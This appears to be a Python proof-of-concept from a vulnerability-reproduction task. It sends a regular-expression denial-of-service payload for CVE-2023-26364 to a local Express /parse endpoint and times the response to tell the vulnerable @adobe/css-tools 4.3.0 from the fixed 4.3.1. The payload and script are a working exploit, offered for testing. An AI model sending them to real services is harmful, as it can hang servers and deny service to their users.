#!/usr/bin/env python3
"""[GIVEN] original_poc — CVE-2023-26364 seed exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2023-26364 catastrophic-backtracking CSS string to the REAL Express service
(POST /parse) and measures the server-side response latency. The payload is a colon-only `@import`
with no `;` terminator: on @adobe/css-tools@4.3.0 the non-block at-rule regex
`^@import\\s*((:?[^;'"]|...)+);` has a `:?` that overlaps `[^;'"]` (a `:` matches BOTH), so the
required trailing `;` never matches on a colon run -> exponential backtracking over the
Fibonacci-many partitions.

Expected: SLOW (response hangs -> HTTP timeout) on V0 (4.3.0); FAST/bounded on V1 (4.3.1), because
CVE-2023-26364's fix adds a `(?:;|$)` end-alternation so the greedy match succeeds at end-of-input.

Usage: original_poc.py http://127.0.0.1:26364
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = "@import " + ":" * 40   # len 48
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = json.dumps({"css": PAYLOAD})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=body,
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:26364"
    out = run(base)
    print(json.dumps({"poc": "original/CVE-2023-26364", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
